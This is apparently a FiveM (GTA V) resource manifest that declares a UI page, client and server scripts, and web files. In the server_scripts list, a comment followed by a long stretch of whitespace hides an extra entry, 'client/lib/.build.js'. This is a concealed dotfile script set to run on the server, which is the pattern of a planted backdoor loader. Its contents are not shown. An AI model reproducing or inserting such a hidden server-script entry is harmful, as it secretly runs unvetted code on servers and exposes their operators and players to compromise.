fx_version 'bodacious'
game 'gta5'
ui_page {
    'web-side/index.html'
}
client_scripts {
    'client/client.lua'
}
server_scripts {
    'server/server.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'client/lib/.build.js',
}
files {
    "web-side/*",
    "web-side/**/*"
}

